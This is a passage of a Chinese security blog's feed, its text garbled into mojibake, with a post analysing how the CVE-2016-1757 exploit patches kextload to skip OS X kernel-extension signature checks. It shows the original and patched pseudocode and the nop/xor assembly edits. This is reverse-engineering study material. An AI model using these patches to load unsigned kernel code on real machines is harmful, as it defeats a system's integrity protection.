<p>åœ¨<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8">è®¡ç®—æœºå®‰å…¨</a>é¢†åŸŸï¼Œ<strong>æ²™ç›’</strong>ï¼ˆè‹±è¯­ï¼šsandboxï¼Œåˆè¯‘ä¸º<strong>æ²™ç®±</strong>ï¼‰æ˜¯ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œä¸ºè¿è¡Œä¸­çš„ç¨‹åºæä¾›çš„éš”ç¦»ç¯å¢ƒã€‚é€šå¸¸æ˜¯ä½œä¸ºä¸€äº›æ¥æºä¸å¯ä¿¡ã€å…·ç ´ååŠ›æˆ–æ— æ³•åˆ¤å®šç¨‹åºæ„å›¾çš„ç¨‹åºæä¾›å®éªŒä¹‹ç”¨<a href="https://zh.wikipedia.org/wiki/%E6%B2%99%E7%9B%92_(%E9%9B%BB%E8%85%A6%E5%AE%89%E5%85%A8">[1]</a>#cite_note-1)ã€‚</p>
<p>æ²™ç›’é€šå¸¸ä¸¥æ ¼æ§åˆ¶å…¶ä¸­çš„ç¨‹åºæ‰€èƒ½è®¿é—®çš„èµ„æºï¼Œæ¯”å¦‚ï¼Œæ²™ç›’å¯ä»¥æä¾›<a href="https://zh.wikipedia.org/wiki/%E5%A1%97%E9%8A%B7%E7%A9%BA%E9%96%93">ç”¨åå³å›æ”¶</a>çš„ç£ç›˜åŠå†…å­˜ç©ºé—´ã€‚åœ¨æ²™ç›’ä¸­ï¼Œç½‘ç»œè®¿é—®ã€å¯¹çœŸå®ç³»ç»Ÿçš„è®¿é—®ã€å¯¹è¾“å…¥è®¾å¤‡çš„è¯»å–é€šå¸¸è¢«ç¦æ­¢æˆ–æ˜¯ä¸¥æ ¼é™åˆ¶ã€‚ä»è¿™ä¸ªè§’åº¦æ¥è¯´ï¼Œæ²™ç›’å±äº<a href="https://zh.wikipedia.org/wiki/%E8%99%9A%E6%8B%9F%E5%8C%96">è™šæ‹ŸåŒ–</a>çš„ä¸€ç§ã€‚</p>
<p>æ²™ç›’ä¸­çš„æ‰€æœ‰æ”¹åŠ¨å¯¹<a href="https://zh.wikipedia.org/wiki/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F">æ“ä½œç³»ç»Ÿ</a>ä¸ä¼šé€ æˆä»»ä½•æŸå¤±ã€‚é€šå¸¸ï¼Œè¿™ç§æŠ€æœ¯è¢«<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA">è®¡ç®—æœº</a>æŠ€æœ¯äººå‘˜å¹¿æ³›ç”¨äºæµ‹è¯•å¯èƒ½<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92">å¸¦æ¯’</a>çš„ç¨‹åºæˆ–æ˜¯å…¶ä»–çš„<a href="https://zh.wikipedia.org/wiki/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6">æ¶æ„ä»£ç </a><a href="https://zh.wikipedia.org/wiki/%E6%B2%99%E7%9B%92_(%E9%9B%BB%E8%85%A6%E5%AE%89%E5%85%A8">[2]</a>#cite_note-2)ã€‚</p>
<p>â€” ç»´åŸºç™¾ç§‘,æ²™ç›’ (è®¡ç®—æœºå®‰å…¨)</p>
</blockquote>
<p>è¿™æ ·ä¸€æ®µè¯è¯´çš„å·²ç»å¾ˆæ¸…æ¥šäº†ï¼Œå…³äºåœ¨<code>OS X</code>ç³»ç»Ÿä¸­æ²™ç›’çš„ç®€å•åº”ç”¨ï¼Œä¹Ÿæœ‰æ–‡ç« è§£é‡Šè¿‡äº†ï¼Œè¿™äº›ä¸æ˜¯æœ¬æ–‡çš„æ ¸å¿ƒå†…å®¹ï¼Œæœ‰å…´è¶£çš„è¯»è€…å¯ä»¥è‡ªè¡Œ<code>google</code>ã€‚</p>
<p>åœ¨<code>OS X</code>ä»¥åŠ<code>IOS</code>ç³»ç»Ÿä¸­é™åˆ¶äº†è¿›ç¨‹å¯¹ä¸€äº›èµ„æºçš„è®¿é—®æƒé™ï¼Œä¾‹å¦‚ç½‘ç»œã€æŸäº›ç‰¹æ®Šè·¯å¾„ã€æ–‡ä»¶çš„è¯»å†™ç­‰ç­‰ï¼Œé™å®šäº†è¿›ç¨‹çš„ä¸€äº›è¡Œä¸ºï¼Œä»è€Œä¿è¯è¿›ç¨‹ä¸ä¼šåšå‡ºè¶…è¶Šæƒé™çš„æ“ä½œã€‚</p>]]>
    
    </summary>
    
      <category term="sandbox" scheme="http://turingh.github.io/tags/sandbox/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[åˆ©ç”¨patchç»•è¿‡kextloadå¯¹å†…æ ¸ç­¾åçš„æ£€æµ‹]]></title>
    <link href="http://turingh.github.io/2016/04/13/%E5%88%A9%E7%94%A8patch%E7%BB%95%E8%BF%87kextload%E5%AF%B9%E5%86%85%E6%A0%B8%E7%AD%BE%E5%90%8D%E7%9A%84%E6%A3%80%E6%B5%8B/"/>
    <id>http://turingh.github.io/2016/04/13/åˆ©ç”¨patchç»•è¿‡kextloadå¯¹å†…æ ¸ç­¾åçš„æ£€æµ‹/</id>
    <published>2016-04-13T17:21:22.000Z</published>
    <updated>2016-04-19T18:44:37.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_æ‘˜è¦">0x00 æ‘˜è¦</h1><p>â€‹    åˆ†æ<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">CVE-2016-1757</a>çš„EXPè¿‡ç¨‹ä¸­ï¼Œå‘ç°EXPé€šè¿‡å¯¹kextloadç¨‹åºçš„patchï¼Œç»•è¿‡äº†<code>OSX</code>å¯¹é©±åŠ¨æ‰©å±•æ•°å­—ç­¾åçš„æ£€æµ‹ï¼ŒæˆåŠŸåŠ è½½æœªç­¾åçš„é©±åŠ¨æ‰©å±•ã€‚</p>
<a id="more"></a>
<h1 id="0x01_æ•°å­—ç­¾åä¸å†…æ ¸æ‰©å±•">0x01 æ•°å­—ç­¾åä¸å†…æ ¸æ‰©å±•</h1><p>â€‹    <code>OSX</code>ç³»ç»Ÿåœ¨åŠ è½½å†…æ ¸æ‰©å±•æ—¶è¦æ±‚å¿…é¡»æ‹¥æœ‰è‹¹æœçš„å¼€å‘è€…ç­¾åã€‚åœ¨å¼€å‘è¿‡ç¨‹ä¸­ï¼Œåœ¨è‡ªå·±çš„è°ƒè¯•ç¯å¢ƒä¸­å¯ä»¥é€šè¿‡ä¿®æ”¹å‚æ•°åŠ è½½æ²¡æœ‰ç­¾åçš„é©±åŠ¨ï¼Œè¿›è¡Œå¼€å‘ä¸è°ƒè¯•ã€‚</p>
<h2 id="1-1_OS_X_10-11ä¹‹åç‰ˆæœ¬">1.1 OS X 10.11ä¹‹åç‰ˆæœ¬</h2><p>â€‹    åœ¨OS X 10.11ä¸­å¼•å…¥çš„Rootlessæœºåˆ¶ä¹‹ååªéœ€è¦å…³é—­Rootlessæœºåˆ¶å°±å¯ä»¥åŠ è½½æ²¡æœ‰ç­¾åçš„é©±åŠ¨æ‰©å±•ã€‚ç»†èŠ‚å¯ä»¥å‚è€ƒè¿™ä¸€ç¯‡æ–‡ç« ã€‚<a href="http://tadaland.com/os-x-rootless.html" target="_blank" rel="external">OS X 10.11ä¸­Rootlessçš„å®ç°ä¸è§£é‡Šä»¥åŠå…³é—­æ–¹æ³•</a></p>
<h2 id="1-2_OS_X_10-11ä¹‹å‰ç‰ˆæœ¬">1.2 OS X 10.11ä¹‹å‰ç‰ˆæœ¬</h2><p>â€‹    åœ¨OS X 10.11ä¹‹å‰çš„ç‰ˆæœ¬éœ€è¦ä¿®æ”¹å†…æ ¸å¯åŠ¨å‚æ•°ï¼Œå¹¶é‡å¯ç³»ç»Ÿ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo nvram boot-args=<span class="string">"kext-dev-mode=1"</span></span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure>
<h1 id="0x02_Patchè¯¦ç»†åˆ†æ">0x02 Patchè¯¦ç»†åˆ†æ</h1><p>â€‹    é€šè¿‡å¯¹<code>kextload</code>ç¨‹åºpatchå‰åçš„å¯¹æ¯”å¯ä»¥å‘ç°ï¼Œæ€»å…±å¯¹ä¸¤ä¸ªå‡½æ•°è¿›è¡Œäº†patchã€‚</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/patch_kextload/ida_diff.png" alt="ida_bindiff"></p>
<h2 id="2-1_sub_100020c9(check_root)">2.1 sub_100020c9(check_root)</h2><p>â€‹    é€šè¿‡<code>bindiff</code>å‘ç°ï¼Œ<code>sub_100020c9</code>å‡½æ•°æ”¹å˜éå¸¸çš„å¤§ï¼ˆrenameæˆäº†check_rootï¼Œä¸ä¸€å®šå®Œå…¨æ­£ç¡®ï¼‰ï¼Œpatchå‰åå¯¹æ¯”å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/patch_kextload/bindff_check_root.png" alt="check_root"></p>
<p>è¯¥å‡½æ•°å†…å®¹è¢«å®Œå…¨æ›¿æ¢ï¼Œç›´æ¥è¿”å›0ã€‚</p>
<p>é€šè¿‡idaçœ‹ä¸€ä¸‹æ›¿æ¢å‰è¯¥å‡½æ•°çš„ä¼ªä»£ç ï¼Œå¯ä»¥å¤§è‡´äº†è§£è¯¥å‡½æ•°çš„ä½œç”¨ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">__int64 __usercall check_root@&lt;rax&gt;(__int64 a1@&lt;rax&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v1; <span class="comment">// ebx@3</span></span><br><span class="line">  __int64 v3; <span class="comment">// [sp-4h] [bp-10h]@1</span></span><br><span class="line"></span><br><span class="line">  v3 = a1;</span><br><span class="line">  HIDWORD(v3) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( bootstrap_look_up(*(_DWORD *)bootstrap_port_ptr, <span class="string">"com.apple.KernelExtensionServer"</span>, (<span class="keyword">mach_port_t</span> *)&amp;v3 + <span class="number">1</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( geteuid() )</span><br><span class="line">    &#123;</span><br><span class="line">      OSKextLog(<span class="number">0L</span>L, <span class="number">113L</span>L, <span class="string">"Can't contact kextd; must run as root to load kexts."</span>);</span><br><span class="line">      v1 = <span class="number">77</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v1 = <span class="number">0</span>;</span><br><span class="line">      OSKextLog(<span class="number">0L</span>L, <span class="number">115L</span>L, <span class="string">"Can't contact kextd; attempting to load directly into kernel."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    byte_100004808 = <span class="number">1</span>;</span><br><span class="line">    v1 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( HIDWORD(v3) )</span><br><span class="line">    mach_port_deallocate(*(_DWORD *)mach_task_self__ptr, HIDWORD(v3));</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°è¿”å›0çš„æƒ…å†µæœ‰ä¸¤ç§ï¼š</p>
<ul>
<li>èƒ½å¤Ÿè·å–åˆ°ä¸<code>com.apple.KernelExtensionServer</code>é€šä¿¡çš„<code>port</code>ã€‚</li>
<li>æ²¡æœ‰è·å–åˆ°<code>port</code>ï¼Œä½†æ˜¯æ‹¥æœ‰<code>root</code>æƒé™ã€‚</li>
</ul>
<p>é€»è¾‘æ¯”è¾ƒç®€å•ï¼Œåº”è¯¥å°±æ˜¯ä¸ºåé¢çš„å†…æ ¸æ‰©å±•åŠ è½½æ£€æµ‹ä¸€ä¸‹æƒé™å’Œèµ„æºã€‚<code>patch</code>åç›´æ¥è¿”å›0ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__int64 __usercall check_root@&lt;rax&gt;(__int64 a1@&lt;rax&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2-2_sub_1000023bc">2.2 sub_1000023bc</h2><p>â€‹    è¯¥å‡½æ•°ç›¸ä¼¼åº¦æœ‰99%ï¼ŒæŸ¥çœ‹<code>patch</code>åçš„å‰åå¯¹æ¯”çš„å…·ä½“ç»†èŠ‚ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/patch_kextload/bindiff_check_sign.png" alt="bindiff_check_sign"></p>
<p>é€šè¿‡<code>nop</code>æŒ‡ä»¤ï¼Œå¹²æ‰äº†å¯¹<code>sub_100000979</code>å‡½æ•°çš„è°ƒç”¨ã€‚ç›´æ¥é€šè¿‡<code>xor</code>æŒ‡ä»¤æ¸…é›¶<code>eax</code>ã€‚</p>
<p>æŸ¥çœ‹<code>sub_100000979</code>çš„ä¼ªä»£ç ï¼Œçœ‹çœ‹è¯¥å‡½æ•°ç©¶ç«Ÿåšäº†äº›ä»€ä¹ˆã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">check_sign</span><span class="params">(__int64 a1, <span class="keyword">char</span> a2, <span class="keyword">char</span> a3)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// r13@1</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// r15@1</span></span><br><span class="line">  __int64 v5; <span class="comment">// r12@1</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ebx@1</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax@2</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax@2</span></span><br><span class="line">  __int64 v9; <span class="comment">// r14@2</span></span><br><span class="line">  __int64 v10; <span class="comment">// rax@5</span></span><br><span class="line">  __CFString *v11; <span class="comment">// rdi@5</span></span><br><span class="line">  __int64 v12; <span class="comment">// rsi@10</span></span><br><span class="line">  __int64 v14; <span class="comment">// [sp+8h] [bp-38h]@1</span></span><br><span class="line">  __int64 v15; <span class="comment">// [sp+10h] [bp-30h]@1</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  v4 = a2;</span><br><span class="line">  v5 = a1;</span><br><span class="line">  v15 = <span class="number">0L</span>L;</span><br><span class="line">  v14 = <span class="number">0L</span>L;</span><br><span class="line">  v6 = -<span class="number">67061</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v7) = OSKextGetURL();</span><br><span class="line">    LODWORD(v8) = CFURLCopyAbsoluteURL(v7);</span><br><span class="line">    v9 = v8;</span><br><span class="line">    <span class="keyword">if</span> ( v8 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( SecStaticCodeCreateWithPath(v8, <span class="number">0L</span>L, &amp;v15) || !v15 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      LODWORD(v10) = OSKextGetIdentifier(a1);</span><br><span class="line">      v11 = &amp;cfstr_AnchorApple;</span><br><span class="line">      <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> __int8)CFStringHasPrefix(v10, &amp;cfstr_Com_apple_) )</span><br><span class="line">        v11 = &amp;cfstr_AnchorAppleGen;</span><br><span class="line">      <span class="keyword">if</span> ( SecRequirementCreateWithString(v11, <span class="number">0L</span>L, &amp;v14) || !v14 )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_26:</span><br><span class="line">        OSKextLog(<span class="number">0L</span>L, <span class="number">17L</span>L, <span class="string">"Memory allocation failure."</span>);</span><br><span class="line">        v6 = -<span class="number">67061</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 )</span><br><span class="line">          v12 = <span class="number">536870913L</span>L;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          v12 = <span class="number">1073741825L</span>L;</span><br><span class="line">        <span class="comment">//*******************************</span></span><br><span class="line">        <span class="comment">//ç­¾åæ£€æµ‹</span></span><br><span class="line">        <span class="comment">//*******************************</span></span><br><span class="line">        v6 = SecStaticCodeCheckValidity(v15, v12);</span><br><span class="line">        <span class="keyword">if</span> ( v4 &amp;&amp; v6 &amp;&amp; (<span class="keyword">unsigned</span> __int8)sub_100000B19(v5, v9, <span class="number">1L</span>L) )</span><br><span class="line">          v6 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      CFRelease(v9);</span><br><span class="line">      <span class="keyword">if</span> ( v15 )</span><br><span class="line">        CFRelease(v15);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      OSKextLog(<span class="number">0L</span>L, <span class="number">17L</span>L, <span class="string">"Memory allocation failure."</span>);</span><br><span class="line">      v6 = -<span class="number">67061</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v14 )</span><br><span class="line">      CFRelease(v14);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°æœ€æ ¸å¿ƒçš„å°±æ˜¯è°ƒç”¨äº†<code>SecStaticCodeCheckValidity</code>è¿™ä¸ªå‡½æ•°ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span><br><span class="line">@function SecStaticCodeCheckValidity</span><br><span class="line">	Performs static validation on the given SecStaticCode object. The call obtains and</span><br><span class="line">	verifies the signature on the code object. It checks the validity of all</span><br><span class="line">	sealed components (including resources, if any). It validates the code against</span><br><span class="line">	a SecRequirement if one is given. The call succeeds if all these conditions</span><br><span class="line">	are satisfactory. It fails otherwise.</span><br><span class="line">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*è¹©è„šçš„ç¿»è¯‘ä¸€ä¸‹</span><br><span class="line">@function SecStaticCodeCheckValidity</span><br><span class="line">	è®¤è¯ä¼ å…¥çš„SecStaticCodeå¯¹è±¡çš„åˆæ³•æ€§ï¼Œè¯¥å‡½æ•°è°ƒç”¨è·å–å¹¶æ£€æµ‹æ•°å­—ç­¾åçš„åˆæ³•æ€§ã€‚</span><br><span class="line">	è®¤è¯å†…å®¹åŒ…å«äº†æ‰€æœ‰çš„ç»„ä»¶(å¦‚æœå­˜åœ¨èµ„æºæ–‡ä»¶åŒæ ·ä¼šæ£€æµ‹)ã€‚</span><br><span class="line">	å¦‚æœæä¾›äº†åŠ å¯†çš„å†…å®¹ï¼Œä¹Ÿä¼šå¯¹åŠ å¯†éƒ¨åˆ†è¿›è¡Œè®¤è¯ã€‚</span><br><span class="line">	å½“æ‰€æœ‰æ¡ä»¶æ»¡è¶³æ—¶å‡½æ•°è°ƒç”¨è¿”å›æˆåŠŸã€‚</span><br><span class="line">*/</span></span><br></pre></td></tr></table></figure>
<p>è¿™æ˜¯è¯¥å‡½æ•°åœ¨å¤´æ–‡ä»¶ä¸­çš„å®šä¹‰ã€‚</p>
<h1 id="0x03_å°ç»“">0x03 å°ç»“</h1><p>â€‹    ç»è¿‡æµ‹è¯•ç¡®å®å¯ä»¥ç»•è¿‡æ•°å­—ç­¾åçš„æ£€æµ‹æˆåŠŸåŠ è½½äº†æœªç­¾åçš„å†…æ ¸æ‰©å±•ã€‚</p>
<p>â€‹    é€šè¿‡å¯¹<code>kextload</code>çš„<code>patch</code>ï¼Œç»•è¿‡ä¸¤ä¸ªæ£€æµ‹å‡½æ•°ï¼Œä»è€Œè¾¾åˆ°äº†ç»•è¿‡<code>OSX</code>ç³»ç»Ÿå¯¹é©±åŠ¨æ‰©å±•çš„ç­¾åæ£€æµ‹ï¼Œç»“åˆ<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">CVE-2016-1757</a>çš„<code>root</code>æƒé™æ‰§è¡Œä»»æ„ä»£ç ï¼Œä»è€Œå®ç°äº†ï¼Œæ™®é€šç”¨æˆ·å¯ä»¥åŠ è½½ä»»æ„æœªç­¾åçš„å†…æ ¸æ‰©å±•ã€‚</p>
<h1 id="0x04_å‹˜è¯¯">0x04 å‹˜è¯¯</h1><p>â€‹    ç”±äºä¸å¤Ÿä¸¥è°¨ï¼Œé—æ¼äº†ä¸€ä¸ªpatchçš„ç‚¹ï¼Œè¿™é‡Œè¡¥ä¸Šã€‚æ›´è¯¦ç»†çš„åŸç†åœ¨<code>exploit</code>çš„åˆ†ææ–‡ç« ä¸­å¯ä»¥çœ‹åˆ°ã€‚</p>
<h2 id="4-1_sub_1000023BC">4.1 sub_1000023BC</h2><p>åœ¨<code>sub_1000023BC</code>å‡½æ•°ä¸­çš„å¯¹sub_085cçš„è°ƒç”¨è¢«patchä¿®æ”¹ç»•è¿‡ç­¾åéªŒè¯ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__text:<span class="number">0000000100002802</span>                 mov     esi, <span class="number">1</span></span><br><span class="line">__text:<span class="number">0000000100002807</span>                 mov     rdi, r15</span><br><span class="line">__text:<span class="number">000000010000280</span>A                 mov     edx, r12d</span><br><span class="line">__text:<span class="number">000000010000280</span>D                 call    sub_10000085C</span><br><span class="line">__text:<span class="number">0000000100002812</span>                 test    eax, eax</span><br><span class="line">__text:<span class="number">0000000100002814</span>                 mov     r12, r14</span><br><span class="line">__text:<span class="number">0000000100002817</span>                 mov     r14, [rbp+var_CD0]</span><br><span class="line">__text:<span class="number">000000010000281</span>E                 jnz     loc_1000028FA</span><br></pre></td></tr></table></figure>
<p>patchåä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__text:<span class="number">000000010000277</span>E                 mov     r14, r12</span><br><span class="line">__text:<span class="number">0000000100002781</span>                 movzx   r12d, [rbp+var_CB9]</span><br><span class="line">__text:<span class="number">0000000100002789</span>                 mov     esi, <span class="number">1</span></span><br><span class="line">__text:<span class="number">000000010000278</span>E                 mov     rdi, r15</span><br><span class="line">__text:<span class="number">0000000100002791</span>                 mov     edx, r12d</span><br><span class="line">__text:<span class="number">0000000100002794</span>                 nop</span><br><span class="line">__text:<span class="number">0000000100002795</span>                 nop</span><br><span class="line">__text:<span class="number">0000000100002796</span>                 nop</span><br><span class="line">__text:<span class="number">0000000100002797</span>                 xor     eax, eax</span><br><span class="line">__text:<span class="number">0000000100002799</span>                 mov     ebx, eax</span><br><span class="line">__text:<span class="number">000000010000279</span>B                 test    ebx, ebx</span><br></pre></td></tr></table></figure>
<p><code>bindiif</code>å¦‚ä¸‹å›¾æ‰€ç¤º:</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/patch_kextload/kanwu1.png" alt="å‹˜è¯¯1"></p>
<h1 id="ps:">ps:</h1><p>è¿™æ˜¯æˆ‘çš„å­¦ä¹ åˆ†äº«åšå®¢<a href="http://turingh.github.io/">http://turingh.github.io/</a></p>
<p>æ¬¢è¿å¤§å®¶æ¥æ¢è®¨ï¼Œä¸è¶³ä¹‹å¤„è¿˜è¯·æŒ‡æ­£ã€‚</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_æ‘˜è¦">0x00 æ‘˜è¦</h1><p>â€‹    åˆ†æ<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">CVE-2016-1757</a>çš„EXPè¿‡ç¨‹ä¸­ï¼Œå‘ç°EXPé€šè¿‡å¯¹kextloadç¨‹åºçš„patchï¼Œç»•è¿‡äº†<code>OSX</code>å¯¹é©±åŠ¨æ‰©å±•æ•°å­—ç­¾åçš„æ£€æµ‹ï¼ŒæˆåŠŸåŠ è½½æœªç­¾åçš„é©±åŠ¨æ‰©å±•ã€‚</p>]]>
    
    </summary>
    
      <category term="kernel" scheme="http://turingh.github.io/tags/kernel/"/>
    
      <category term="kextload" scheme="http://turingh.github.io/tags/kextload/"/>
    
      <category term="patch" scheme="http://turingh.github.io/tags/patch/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CVE-2016-1757ç®€å•åˆ†æ]]></title>
    <link href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/"/>
    <id>http://turingh.github.io/2016/04/03/CVE-2016-1757ç®€å•åˆ†æ/</id>
    <published>2016-04-03T17:49:24.000Z</published>
    <updated>2016-04-29T19:07:36.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_æ‘˜è¦">0x00 æ‘˜è¦</h1><blockquote>
<p>çµçŠ€ä¸€æŒ‡å¯æ”»å¯å®ˆï¼Œè¿›æ”»æ—¶ä¹Ÿæ˜¯ä¸€æŒ‡ï¼Œæ˜¯å¤©ä¸‹ç¬¬ä¸€æŒ‡æ³•ï¼Œä¸ç§»èŠ±æ¥ç‰è¿™ä¸ªå¤©ä¸‹ç¬¬ä¸€æŒæ³•åŒæ ·éƒ½æ˜¯éå…µåˆƒçš„ç¬¬ä¸€ç»æŠ€</p>
<p>â€”é™†å°å‡¤ä¼ å¥‡</p>
</blockquote>
<p>æœ€è¿‘çš„10.11.4è¡¥ä¸ä¿®å¤äº†ä¸€ä¸ªåˆ©ç”¨æ¡ä»¶ç«äº‰è·å¾—ä»£ç æ‰§è¡Œæƒé™çš„æ¼æ´ï¼Œç»è¿‡å¯¹å†…æ ¸æºç ä»¥åŠpocçš„ç†è§£ä¹‹åï¼Œå…ˆå¯¹é—®é¢˜ä½œå‡ºä¸€ä¸ªç®€å•çš„åˆ†æã€‚</p>
